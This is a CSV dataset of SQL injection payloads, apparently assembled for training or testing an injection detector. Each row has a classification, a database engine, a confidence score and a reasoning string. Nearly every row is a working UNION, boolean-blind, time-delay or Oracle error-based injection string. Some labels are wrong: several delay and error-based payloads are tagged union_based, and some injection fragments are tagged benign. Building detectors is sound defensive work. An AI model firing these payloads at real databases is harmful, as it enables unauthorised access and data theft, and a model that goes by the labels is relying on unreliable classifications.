id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
507,"-2319 union all select 5068,5068,5068#",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
509,"-9656"" union all select 8735,8735--",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
512,-4892%' ) ) or 2251 = 9881--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
513,"-5859 ) as ernq where 8394 = 8394 union all select 8394,8394,8394--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
514,"-4076' ) ) union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
515,-6233' ) where 9820 = 9820 or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
516,"-8950"" ) ) as uahs where 2113 = 2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",union_based,generic,0.7,UNION-based payload detected. Payload length: 104 chars.,2
518,1' and 1541 = 6868#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 19 chars.,2
522,"1' union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
528,"-9135"" ) ) or 6872 = 6872 and ( ( ""fllx"" = ""fllx",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
530,"-9881"" ) ) or 9850 = 8118#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
531,"1 ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
532,"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
535,"1 union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
536,-7859 ) as ipdg where 4413 = 4413 or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
542,"-3081"" ) ) ) or 3736 = 1899",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
548,"1%' ) ) ) union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
553,"-3933' ) ) ) union all select 6198,6198,6198,6198,6198#",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
555,"-3361 ) ) union all select 2827,2827,2827,2827#",union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
560,"-6333"" ) ) ) union all select 9851,9851,9851,9851,9851,9851--",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
561,"-1808%"" ) ) or 4595 = 3545 and ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 42 chars.,2
563,"1%"" union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
564,"-7635"" union all select 1284,1284,1284,1284,1284,1284#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
569,"1' ) as knxr where 5662 = 5662 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
570,-6045 or 8919 = 2827--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
573,"-3349 ) ) ) union all select 6553,6553#",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
577,-7505' ) ) as lqvw where 8565 = 8565 or 6872 = 6872--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,2
578,"-3513%"" union all select 8473,8473#",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
585,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
587,"-9286"" ) ) as mfxl where 9348 = 9348 union all select 9348#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
588,"1%"" ) ) union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
589,"1' ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
590,"-8636"" ) ) ) union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",union_based,generic,0.7,UNION-based payload detected. Payload length: 81 chars.,2
591,"-6940' ) union all select 3042,3042,3042,3042,3042#",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
593,1 ) as qgsb where 7600 = 7600 and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,2
594,1' where 4795 = 4795 and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
596,"1 ) as ghew where 6441 = 6441 union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
597,"-2548"" ) ) ) or 5107 = 8049--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
599,"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
431,"1' ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
455,1' where 7191 = 7191 rlike sleep ( 5 ) --,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
458,"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'acly' like 'acly",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
479,"1%' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
484,1' ) rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
551,"1"" ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
566,"1"" ) as yekp where 3049 = 3049 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
567,"1%"" ) rlike sleep ( 5 ) and ( ""%"" = """,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
576,"1 ) ) as ambt where 5198 = 5198 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
582,"1' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
436,1' ) where 6622 = 6622 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 35 chars.,1
469,"1%"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
472,"1%"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
483,"1%' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
490,"1"" where 7739 = 7739 and sleep ( 5 ) --",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
521,"-3234%"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""%"" = """,boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
540,"-8893%' ) ) or elt ( 1032 = 1032,3623 ) and ( ( '%' = '",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
559,"1%"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""%"" = """,boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
565,1' ) ) as pgif where 6346 = 6346,benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 32 chars.,1
572,"1' ) as xvcr where 6456 = 6456 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
574,"-3475"" or elt ( 5532 = 4242,4242 )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
580,"1' ) and elt ( 3528 = 3566,3566 )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
583,"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) # igen",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
592,"1"" ) as rnjx where 2679 = 2679 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
410,1' ) and ( 7603 = 3634 ) *3634,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 30 chars.,1
456,"1' ) ) and make_set ( 8245 = 9872,9872 ) and ( ( 'kzgt' = 'kzgt",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 63 chars.,1
466,-6865 ) or ( 8459 = 8459 ) *4906 and ( 6107 = 6107,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,1
475,"1"" ) and ( 3020 = 3020 ) *6703 and ( ""hkjf"" = ""hkjf",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,1
477,"1%"" ) and ( 6016 = 4763 ) *4763 and ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,1
534,-7111' or ( 8459 = 8459 ) *4906,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 31 chars.,1
541,"-8791"" ) ) ) or make_set ( 6681 = 6620,6620 ) and ( ( ( ""pvdk"" = ""pvdk",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 70 chars.,1
558,"1%"" ) and ( 3020 = 3020 ) *6703 and ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,1
468,1' ) ) as eymg where 7000 = 7000,benign,generic,0.5,. Payload length: 32 chars.,1
489,"1"" ) where 6897 = 6897",benign,generic,0.5,. Payload length: 22 chars.,1
500,1 ) as gbtj where 8175 = 8175,benign,generic,0.5,. Payload length: 29 chars.,1
501,1 ) as lisg where 5490 = 5490,benign,generic,0.5,. Payload length: 29 chars.,1
517,1 ) ) as muyz where 6105 = 6105,benign,generic,0.5,. Payload length: 31 chars.,1
519,1 ) where 1402 = 1402,benign,generic,0.5,. Payload length: 21 chars.,1
523,1 where 9872 = 9872,benign,generic,0.5,. Payload length: 19 chars.,1
538,1 ) where 5774 = 5774,benign,generic,0.5,. Payload length: 21 chars.,1
562,1 ) as bhdj where 4472 = 4472,benign,generic,0.5,. Payload length: 29 chars.,1
402,1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
403,"1"" ) ) as vbpl where 3885 = 3885 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
404,select pg_sleep ( 5 ) and ( ( 'enpn' like 'enpn,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
406,select ( case when ( 1275 = 7674 ) then 1275 else 1275* ( select 1275 from information_schema.character_sets ) end ) #,union_based,mssql,1.0,"Signals: 'char', 'case', 'information_schema'; UNION-based payload detected; DB: mssql",0
409,1'|| ( select 'tfqg' from dual where 9862 = 9862 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,union_based,mysql,1.0,"Signals: 'sleep', 'dual'; UNION-based payload detected; DB: mysql",0
414,select ( case when ( 1039 = 5127 ) then 1039 else 1039* ( select 1039 from information_schema.character_sets ) end ) #,union_based,mssql,1.0,"Signals: 'char', 'case', 'information_schema'; UNION-based payload detected; DB: mssql",0
416,"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
417,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'nimx' = 'nimx",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
418,"1'|| ( select 'kojx' from dual where 8140 = 8140 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",union_based,mysql,1.0,"Signals: 'benchmark', 'dual'; UNION-based payload detected; DB: mysql",0
420,"-9854 ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 5696 = 5696",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
424,"1"" ) ) as uaxn where 5657 = 5657 rlike ( select ( case when ( 3548 = 7206 ) then 1 else 0x28 end ) ) --",union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
430,1' ) as llug where 2244 = 2244 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
434,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'dthp' = 'dthp",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
435,"1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""tfok"" like ""tfok",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
437,"1'+ ( select 'yzxc' where 5230 = 5230 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
441,1' ) ) as plbt where 4368 = 4368 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
444,1' where 6913 = 6913 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
445,"-5243"" where 2105 = 2105 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
446,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""ulfr"" like ""ulfr",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr', 'dual'; UNION-based payload detected; DB: oracle",0
448,1 ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 3945 = 3945,union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
451,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual ) ||'",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr', 'dual'; UNION-based payload detected; DB: oracle",0
453,1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'smrw' like 'smrw,union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
457,"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'wjwn' = 'wjwn",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
465,1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'vhqm' = 'vhqm,union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
